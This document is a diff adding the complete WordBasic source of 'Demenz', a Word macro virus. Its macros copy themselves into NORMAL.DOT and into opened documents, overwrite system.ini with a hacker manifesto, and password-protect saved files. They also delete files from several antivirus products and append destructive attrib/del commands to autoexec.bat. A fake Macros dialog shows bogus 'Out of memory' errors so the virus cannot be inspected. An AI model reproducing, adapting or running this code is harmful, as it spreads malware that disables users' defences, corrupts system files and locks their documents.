@@ -1,0 +1,285 @@
+Name: Demenz
+Author: Serialkiller 
+Resident: No
+Encryption: Yes
+Steahlt: Yes
+
+The virus have 5 macros:
+- AutoOpen
+- AutoNew
+- Demenz
+- ToolsMacro
+- FileSave
+
+=============================================================================
+=============================================================================
+[AutoOpen]
+
+Sub MAIN
+On Error Resume Next
+n$ = DefaultDir$(2) + "\NORMAL.DOT"
+f$ = FileName$()
+If GetAttr(n$) < 32 Then Goto del
+a = CountMacros(0)
+If a > 0 Then
+	For b = 1 To a
+		If MacroName$(b, 0) = "AutoOpen" Then c = 1
+	Next b
+End If	
+
+If c <> 1 Then
+Organizer .Copy, .Source = f$, .Destination = n$, .Name = "AutoOpen", .Tab = 3	
+Organizer .Copy, .Source = f$, .Destination = n$, .Name = "AutoNew", .Tab = 3
+Organizer .Copy, .Source = f$, .Destination = n$, .Name = "Demenz", .Tab = 3
+Organizer .Copy, .Source = f$, .Destination = n$, .Name = "FileSave", .Tab = 3
+Organizer .Copy, .Source = f$, .Destination = n$, .Name = "ToolsMacro", .Tab = 3
+
+End If
+
+aa = CountMacros(1)
+If aa > 0 Then
+	For bb = 1 To aa
+		If MacroName$(bb, 1) = "AutoOpen" Then cc = 1
+	Next bb
+End If	
+
+If cc <> 1 Then
+	FileSaveAs .Format = 1
+	fm$ = FileName$() + ":AutoOpen"
+	MacroCopy "AutoOpen", fm$
+	fm$ = FileName$() + ":AutoNew"
+	MacroCopy "AutoNew", fm$
+	fm$ = FileName$() + ":Demenz"
+	MacroCopy "Demenz", fm$
+	fm$ = FileName$() + ":FileSave"
+	MacroCopy "FileSave", fm$
+	fm$ = FileName$() + ":ToolsMacro"
+	MacroCopy "ToolsMacro", fm$
+
+End If
+End Sub
+
+=============================================================================
+
+[AutoNew]
+
+Sub MAIN
+On Error Goto Finish
+DisableInput 1
+Call AutoOpen
+On Error Resume Next
+SetAttr "C:\Windows\system.ini", 0
+	Open "C:\Windows\system.ini" For Output As #1
+	Print #1, "[*****************************]"
+	Print #1, "[***The Hacker´s Manifesto ***]"
+	Print #1, "[*****************************]"
+	Print #1, "[]"
+	Print #1, "[]"
+	Print #1, "[This is our world now ...]"
+	Print #1, "[the world of the electron and the switch,]"
+	Print #1, "[the beaty of the baud. We make use of a servive already]"
+	Print #1, "[existing without paying for what could be dirt-cheap]"
+	Print #1, "[if it wasn´t run by profiteering gluttons, and you]"
+	Print #1, "[callus criminals. We explore... and YOU call us]"
+	Print #1, "[criminals. We seek after knowledge... and YOU,]"
+	Print #1, "[call us criminals. We exist without skin color]"
+	Print #1, "[without nationality, without religious bias...]"
+	Print #1, "[and YOU call us criminals.]"
+	Print #1, "[YOU build atomic bombs, YOU wage wars, YOU murder,]"
+	Print #1, "[cheat, and let lie to us and try to make us belive it´s]"
+	Print #1, "[for OUR OWN GOOD, yet we´re the criminals.]"
+	Print #1, "[]"
+	Print #1, "[]"
+	Print #1, "[Yes I´m a criminal. My crime is that of coriosity.]"
+	Print #1, "[My crime is that of judging people by what they say]"
+	Print #1, "[and think, not what they look like. My crime is that]"
+	Print #1, "[of outsmarting YOU, something that YOU will never]"
+	Print #1, "[forgive me for.]"
+	Print #1, "[]"
+	Print #1, "[]"
+	Print #1, "[I am a hacker, and this is my manifesto.]"
+	Print #1, "[YOU may stop this individual, but YOU can´t stop us ALL]"
+	Print #1, "[]"
+	Print #1, "[]"
+	Print #1, "[]"
+	Print #1, "[Serialkiller present´s]"
+	Print #1, "[]"
+	Print #1, "[THE Demenz virus]"
+	Print #1, "[Greetings to all membaz aff the Codebreakers]"
+	Close #1
+
+Finish:
+End Sub
+
+=============================================================================
+
+[FileSave]
+
+Sub MAIN
+FileSave
+On Error Resume Next
+FileSaveAs .Password = "Concetta"
+End Sub
+
+=============================================================================
+
+[Demenz]
+
+Sub MAIN
+On Error Resume Next
+SE1$ = Files$("C:\PC-Cillin 95\Scan32.dll")
+If SE1$ = "" Then Goto AV2
+SetAttr "c:\autoexec.bat", 0
+Open "c:\autoexec.bat" For Append As #1
+Print #1, "@echo off"
+Print #1, "attrib -h -r -s +a c:\pc-cil~1\*.* >nul"
+Print #1, "del c:\pc-cil~1\*.dll >nul"
+Close #1
+Kill "C:\PC-Cillin 95\Lpt$vpn.*"
+
+AV2:
+SE2$ = Files$("C:\PC-Cillin 97\Scan32.dll")
+If SE2$ = "" Then Goto AV3
+SetAttr "c:\autoexec.bat", 0
+Open "c:\autoexec.bat" For Append As #1
+Print #1, "@echo off"
+Print #1, "attrib -h -r -s +a c:\pc-cil~1\*.* >nul"
+Print #1, "del c:\pc-cil~1\*.dll >nul"
+Close #1
+Kill "C:\PC-Cillin 97\Lpt$vpn.*"
+
+AV3:
+SE3$ = Files$("C:\Tsc\PC-Cillin 97\Scan32.dll")
+If SE3$ = "" Then Goto AV4
+SetAttr "c:\autoexec.bat", 0
+Open "c:\autoexec.bat" For Append As #1
+Print #1, "@echo off"
+Print #1, "attrib -h -r -s +a c:\tsc\pc-cil~1\*.* >nul"
+Print #1, "del c:\tsc\pc-cil~1\*.dll >nul"
+Close #1
+Kill "C:\Tsc\PC-Cillin 97\Lpt$vpn.*"
+
+AV4:
+SE4$ = Files$("C:\Zlockav\Gsav.dat")
+If SE4$ = "" Then Goto AV5
+Kill SE4$
+Kill "C:\Zlockav\Gsav.cas"
+
+AV5:
+SE5$ = Files$("C:\VB7\Virus.txt")
+If SE5$ = "" Then Goto AV6
+Kill SE5$
+
+AV6:
+SE6$ = Files$("C:\Program Files\Norton AntiVirus\Viruscan.dat")
+If SE6$ = "" Then Goto AV7
+Kill SE6$
+Kill "C:\Program Files\Symantec\Symevnt.386"
+
+AV7:
+SE7$ = Files$("C:\Program Files\McAfee\VirusScan95\Scan.dat")
+If SE7$ = "" Then Goto AV8
+Kill SE7$
+Kill "C:\Program Files\McAfee\VirusScan95\Mcscan32.dll"
+
+AV8:
+SE8$ = Files$("C:\Program Files\McAfee\VirusScan\Scan.dat")
+If SE8$ = "" Then Goto AV9
+Kill SE8$
+Kill "C:\Program Files\McAfee\VirusScan\Mcscan32.dll"
+
+AV9:
+SE9$ = Files$("C:\Program Files\Command Software\F-PROT95\Sign.def")
+If SE9$ = "" Then Goto AV10
+Kill SE9$
+Kill "C:\Program Files\Command Software\F-PROT95\Dvp.vxd"
+
+AV10:
+SE10$ = Files$("C:\Program Files\AntiViral Toolkit Pro\Avp32.exe")
+If SE10$ = "" Then Goto AV11
+Kill SE10$
+Kill "C:\Program Files\AntiViral Toolkit Pro\*.avc"
+
+AV11:
+SE11$ = Files$("C:\TBAVW95\Tbscan.sig")
+If SE11$ = "" Then Goto joke
+SetAttr "c:\autoexec.bat", 0
+Open "c:\autoexec.bat" For Append As #1
+Print #1, "@echo off"
+Print #1, "attrib -h -r -s +a c:\Tbavw95\*.* >nul"
+Print #1, "del c:\Tbavw95\Tb*.* >nul"
+Close #1
+Kill "C:\Tbavw95\Tbavw95.vxd"
+
+joke:
+SE12$ = Files$("C:\Programme\Norton AntiVirus\*.dat")
+If SE12$ = "" Then Goto exit
+SetAttr "c:\autoexec.bat", 0
+Open "c:\autoexec.bat" For Append As #1
+Print #1, "@echo off"
+Print #1, "attrib -h -r -s +a c:\Programme Norton AntiVirus\*.* >nul"
+Print #1, "del c:\Norton AntiVirus\*.* >nul"
+Close #1
+Kill "C:\Programme\Norton AntiVirus\*.dat"
+Kill "C:\Programme\Symantec\Symevnt.386"
+exit:
+End Sub
+
+=============================================================================
+[ToolsMacro]
+
+Sub MAIN
+
+B$ = "Out of memory."
+C$ = "WordBasic Err = 7"               
+Dim ComboBox1$(0)                       
+ComboBox1$(0) = ""                      
+Dim ListBox1$(0)
+ListBox1$(0) = ""                       
+Dim DropListBox2$(0)
+DropListBox2$(0) = "Normal.dot(Global Template)"
+                                        
+                                        
+A:
+Begin Dialog UserDialog 442, 320, "Macro"       
+ CancelButton 290, 38, 141, 21                  
+  PushButton 290, 14, 141, 21, "Rec&ord...", .D2
+                                                
+                                                
+  PushButton 290, 72, 141, 21, "&Run", .D3      
+ PushButton 290, 97, 141, 21, "&Cancel", .D4    
+ PushButton 290, 125, 141, 21, "&Delete", .D5   
+ PushButton 290, 161, 141, 21, "Or&ganizer...", .D6     
+ ComboBox 7, 23, 269, 194, ComboBox1$(), .ComboBox1     
+                                                        
+  Text 6, 223, 93, 13, "Macros &Available In:", .T1     
+  Text 7, 259, 109, 13, "Description:", .T2             
+  Text 7, 7, 93, 13, "&Macro Name:", .T3
+ ListBox 7, 276, 425, 38, ListBox1$(), .LB1             
+                                                        
+ DropListBox 6, 238, 425, 19, DropListBox2$(), .LB2     
+ 
+End Dialog                              
+
+Redim dlg As UserDialog                 
+ x = Dialog(dlg)                        
+Select Case x
+ Case 0                                 
+  Cancel                                
+ Case 1
+  MsgBox B$, C$, 48                     
+  Goto A                                
+ Case 2                                 
+  MsgBox B$, C$, 48                     
+  Goto A
+ Case 3
+  MsgBox B$, C$, 48
+  Goto A
+ Case 4
+  MsgBox B$, C$, 48
+  Goto A
+ Case 5
+  MsgBox B$, C$, 48
+  Goto A
+ End Select
+End Sub
